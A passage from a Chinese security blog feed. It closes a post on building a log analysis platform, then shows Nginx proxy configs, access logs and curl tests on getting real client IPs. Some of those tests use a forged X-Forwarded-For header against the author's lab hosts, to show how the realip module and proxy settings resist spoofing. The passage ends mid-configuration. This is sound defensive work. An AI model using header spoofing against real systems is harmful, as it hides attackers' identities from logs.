title="数据挖掘分析"></a>数据挖掘分析</h3><ul><li>异常场景分析：通过聚类、分类等数据挖掘方法分析单点异常、上下文异常、集体异常等。</li><li>未知场景分析：通过机器学习算法识别0Day、Bypass技巧等。</li></ul><p>日志分析的思路：思考各种场景，合理利用已有信息与可获取信息从而让信息产生价值。</p><h2 id="gt-gt-gt-gt-优化日志平台"><a href="#gt-gt-gt-gt-优化日志平台" class="headerlink" title="&gt;**&gt;&gt;&gt;**优化日志平台"></a><strong>&gt;**</strong>&gt;<strong><strong>&gt;</strong></strong>&gt;**优化日志平台</h2><p>统一日志分析平台不是简单的有一套系统，做个大屏biubiubiu就完事了的。搭建日志分析平台是一项集技术、沟通撕逼、运营的老大难项目，50%的人死在了起点、30%的人死在了中途、15%的人死在了成功的前一步，只有5%的人做好了这个平台。</p><p>日志分析坑太多，如果领导支持人力与财力，就可以考虑买一套产品再有人来维护是最好的状态！如果领导不支持人力与财力，算了吧！利用运维的东西做一做也挺好。</p><p>统一日志分析平台的工作在小B看来可以简单分为2个阶段：</p><ol><li>平台实现：<code>日志规范化 --&gt; 日志采集 --&gt; 日志存储 --&gt; 日志分析 --&gt; 日志展示 --&gt; 告警实现</code>，在这些部分中，小B认为日志规范化是很重要的一步，因为这个步骤是牵扯到与其他团队的配合最多的一步，尽可能的把要做的工作集中一次性完成(虽然这是不可能的)。</li><li>平台优化：这个阶段是对平台实现中的每一个步骤进行优化。</li></ol><p>对于平台优化又可以简单细分为(小B能想到的就这么多)：</p><ul><li><p>规范优化</p></li><li><ul><li>日志种类优化：系统、服务、应用、业务等日志都需要采集；</li><li>日志字段优化：采集尽可能多且有用的信息；</li><li>日志格式优化：从TXT到JSON(从JSON到Protocol Buffer)；</li></ul></li><li><p>采集优化：从Rsyslog到Logstash、从Logstash到Flume、Filebeat(主要是对客户端系统性能影响优化)；</p></li><li><p>传输优化：从无到有的消息队列、从不可靠传输(UDP)到可靠传输(TCP)、从无加密到加密(SSL)；</p></li><li><p>存储优化：从文本存储到数据库存储、从数据库存储到分布式文件系统；</p></li><li><p>分析优化：从单一场景到多场景、从经验之谈到数据分析技巧；</p></li><li><p>展示优化：从地图炮到直观安全风险展示、从单一到丰富；</p></li><li><p>告警优化：从每天报警不断到分级别告警、从单一告警方式到多层次告警；</p></li><li><p>架构优化：从单机到集群、从单集群到分布式集群；</p></li></ul><p><strong>关键是：**</strong>持续运营，能力沉淀、数据沉淀**</p>]]></content>
      
      
      
        <tags>
            
            <tag> 日志分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日志分析系列-Nginx透过代理获取真实客户端IP</title>
      <link href="/2020/03/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-Nginx%E9%80%8F%E8%BF%87%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP/"/>
      <url>/2020/03/16/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-Nginx%E9%80%8F%E8%BF%87%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP/</url>
      
        <content type="html"><![CDATA[<p>小B是Q公司的安全攻城狮，为了完成任务小B开始做起了调研(欲知背景如何，且听下回分说)。</p><p>首先小B弄明白了Q公司的应用系统架构是：<code>Client --&gt; CDN --&gt; SLB --&gt; Server</code>。</p><p>发现在应用服务器上Nginx日志中采集的关于定位用户身份信息的IP维度数据不准确。不准确的原因是：因为在应用服务器中Nginx使用<code>XFF</code>与<code>remote_addr</code>字段采集客户IP，XFF字段很好被攻击者伪造，而<code>remote_addr</code>字段一般采集都是直连时的IP，在经过多层代理、网关等设备时，更容易导致后端服务器获取的客户端IP不真实。</p><p>于是乎小B开始研究”Nginx如何获取客户端真实IP”，下文是一些研究总结：</p><h1 id="默认设置获取到不真实的IP"><a href="#默认设置获取到不真实的IP" class="headerlink" title="默认设置获取到不真实的IP"></a>默认设置获取到不真实的IP</h1><h2 id="代理与服务器配置"><a href="#代理与服务器配置" class="headerlink" title="代理与服务器配置"></a>代理与服务器配置</h2><ul><li>Nginx_Server配置：<code>vim /opt/nginx/conf/nginx.conf</code>，服务器不作任何修改</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                    &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                    &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">  access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">  # ************* 省略了中间的配置</span><br><span class="line">  </span><br><span class="line">  server &#123;</span><br><span class="line">      listen       80;</span><br><span class="line">      server_name  localhost;</span><br><span class="line"></span><br><span class="line">      #charset koi8-r;</span><br><span class="line"></span><br><span class="line">      #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">      location / &#123;</span><br><span class="line">          root   html;</span><br><span class="line">          index  index.html index.htm;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1配置：<code>vim /opt/nginx/conf/nginx.conf</code>，配置代理转发</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.99;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2配置：<code>vim /opt/nginx/conf/nginx.conf</code>，配置代理转发</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.100;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="正常访问的日志情况"><a href="#正常访问的日志情况" class="headerlink" title="正常访问的日志情况"></a>正常访问的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-Nginx%E9%80%8F%E8%BF%87%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP/640.webp" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问</span><br><span class="line">curl -XGET &quot;http://10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.99 - - [11/Dec/2019:09:04:42 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [11/Dec/2019:09:04:43 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [11/Dec/2019:09:04:42 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中无法获取客户端真实IP。</p><h2 id="伪造XFF的日志情况"><a href="#伪造XFF的日志情况" class="headerlink" title="伪造XFF的日志情况"></a>伪造XFF的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端访问时使用XFFcurl -XGET &quot;http://10.10.10.98&quot; -H &quot;X-Forwarded-For: 10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.99 - - [11/Dec/2019:09:07:33 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [11/Dec/2019:09:07:32 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [11/Dec/2019:09:07:32 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中无法获取客户端真实IP。</p><h1 id="使用X-Forwarded-For-Nginx-readip模块获取"><a href="#使用X-Forwarded-For-Nginx-readip模块获取" class="headerlink" title="使用X-Forwarded-For+Nginx readip模块获取"></a>使用X-Forwarded-For+Nginx readip模块获取</h1><p>使用<code>realip</code>模块可以获取客户端真实IP，该方法也是目前使用最多最有效的方法。</p><p>查看nginx的编译参数：<code>/opt/nginx/sbin/nginx -V</code>(如果是yum安装Nginx，则该模块是默认安装的，我这里是使用编译安装的)</p><p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-Nginx%E9%80%8F%E8%BF%87%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200316163952.jpg" alt=""></p><ul><li><code>set_real_ip_from</code>：表示从何处获取真实IP，只认可自己信赖的IP，可以是网段，也可以设置多个。</li><li><code>real_ip_header</code>：表示从哪个header属性中获取真实IP。</li><li><code>real_ip_recursive</code>：递归检索真实IP，如果从X-Forwarded-For中获取，则需要递归检索；如果中X-Real-IP中获取，无需递归。</li></ul><h2 id="代理与服务器配置-1"><a href="#代理与服务器配置-1" class="headerlink" title="代理与服务器配置"></a>代理与服务器配置</h2><ul><li>Nginx_Server配置：<code>vim /opt/nginx/conf/nginx.conf</code>，主要是在Server中新增代理服务器信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    # ************* 省略了中间的配置</span><br><span class="line">    </span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line">        # 注意这里的key value之间使用Tab而不要使用单个空格</span><br><span class="line">        set_real_ip_from        10.10.10.98;</span><br><span class="line">        set_real_ip_from        10.10.10.99;</span><br><span class="line">        real_ip_header  X-Forwarded-For;</span><br><span class="line">        real_ip_recursive       on;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>检查配置文件是否正确：<code>/opt/nginx/sbin/nginx -t</code>，然后重新加载配置文件：<code>/opt/nginx/sbin/nginx -s reload</code></p><ul><li>Proxy_1配置：<code>vim /opt/nginx/conf/nginx.conf</code>，设置代理并且设置XFF字段信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           #root   html;</span><br><span class="line">           #index  index.html index.htm;</span><br><span class="line">           # 注意这里的key value之间使用Tab</span><br><span class="line">           proxy_pass  http://10.10.10.99;</span><br><span class="line">           proxy_set_header    Host    $http_host;</span><br><span class="line">           proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2配置：<code>vim /opt/nginx/conf/nginx.conf</code>，设置代理并且设置XFF字段信息。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">    access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">    # ************* 省略了中间的配置</span><br><span class="line">    </span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  localhost;</span><br><span class="line"></span><br><span class="line">        #charset koi8-r;</span><br><span class="line"></span><br><span class="line">        #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            #root   html;</span><br><span class="line">            #index  index.html index.htm;</span><br><span class="line">            # 注意这里的key value之间使用Tab</span><br><span class="line">            proxy_pass  http://10.10.10.100;</span><br><span class="line">            proxy_set_header    Host    $http_host;</span><br><span class="line">            proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="正常访问的日志情况-1"><a href="#正常访问的日志情况-1" class="headerlink" title="正常访问的日志情况"></a>正常访问的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问curl -XGET &quot;http://10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:19:21 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1, 10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:19:21 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:09:19:21 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.1&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中remote_addr就是用户的真实IP。</p><h2 id="伪造XFF的日志情况-1"><a href="#伪造XFF的日志情况-1" class="headerlink" title="伪造XFF的日志情况"></a>伪造XFF的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/rbP97vC6miakmiczccbqNf3MaYWllsVtYhamfxIXlltjF7lu97kIVrGhWWFHqQDYnsKshU8Fq3EDkIGQr89IckUg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端访问时使用XFFcurl -XGET &quot;http://10.10.10.98&quot; -H &quot;X-Forwarded-For: 10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:20:03 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5, 10.10.10.1, 10.10.10.98&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.1 - - [09/Dec/2019:09:20:03 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.98 - - [09/Dec/2019:09:20:03 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;10.10.10.5, 10.10.10.1&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中XFF字段依旧代表客户端的真实IP，并且伪造的IP并没有传递到Nginx_Server中。</p><h2 id="使用代理的日志情况"><a href="#使用代理的日志情况" class="headerlink" title="使用代理的日志情况"></a>使用代理的日志情况</h2><p>此时我们的网络架构为：</p><p><img src="/images/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97-Nginx%E9%80%8F%E8%BF%87%E4%BB%A3%E7%90%86%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E5%AE%A2%E6%88%B7%E7%AB%AFIP/640.webp" alt="img"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 客户端使用命令访问，我这里配置的是终端全局代理，所以不用单独指定代理参数curl -XGET &quot;http://47.x.x.156&quot;</span><br></pre></td></tr></table></figure><ul><li>Nginx_Server日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.x.x.74 - - [09/Dec/2019:14:58:02 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;43.x.x.74, 172.16.178.76&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">43.x.x.74 - - [09/Dec/2019:14:58:02 +0800] &quot;GET / HTTP/1.1&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><ul><li>Proxy_2日志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.178.76 - - [09/Dec/2019:14:58:02 +0800] &quot;GET / HTTP/1.0&quot; 200 612 &quot;-&quot; &quot;curl/7.64.1&quot; &quot;43.x.x.74&quot;</span><br></pre></td></tr></table></figure><p>此时在Nginx_Server中XFF字段就是用户的代理IP，并且可以看到单独使用Nginx无法获取客户端的真实IP。</p><h1 id="使用X-Forwarded-For与安全设置获取"><a href="#使用X-Forwarded-For与安全设置获取" class="headerlink" title="使用X-Forwarded-For与安全设置获取"></a>使用X-Forwarded-For与安全设置获取</h1><p>在第一层代理服务器位置，处理用户传递的XFF信息，忽略用户的XFF值。</p><h2 id="代理与服务器配置-2"><a href="#代理与服务器配置-2" class="headerlink" title="代理与服务器配置"></a>代理与服务器配置</h2><ul><li>Nginx_Server配置：<code>vim /opt/nginx/conf/nginx.conf</code>，Nginx_Server配置不作任何修改，默认即可。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / &#123;</span><br><span class="line">           root   html;</span><br><span class="line">           index  index.html index.htm;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li>Proxy_1配置：<code>vim /opt/nginx/conf/nginx.conf</code>，定义XFF为remote_addr。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                     &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                     &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line"></span><br><span class="line">   access_log  logs/access.log  main;</span><br><span class="line"></span><br><span class="line">   # ************* 省略了中间的配置</span><br><span class="line">   </span><br><span class="line">   server &#123;</span><br><span class="line">       listen       80;</span><br><span class="line">       server_name  localhost;</span><br><span class="line"></span><br><span class="line">       #charset koi8-r;</span><br><span class="line"></span><br><span class="line">       #access_log  logs/host.access.log  main;</span><br><span class="line"></span><br><span class="line">       location / 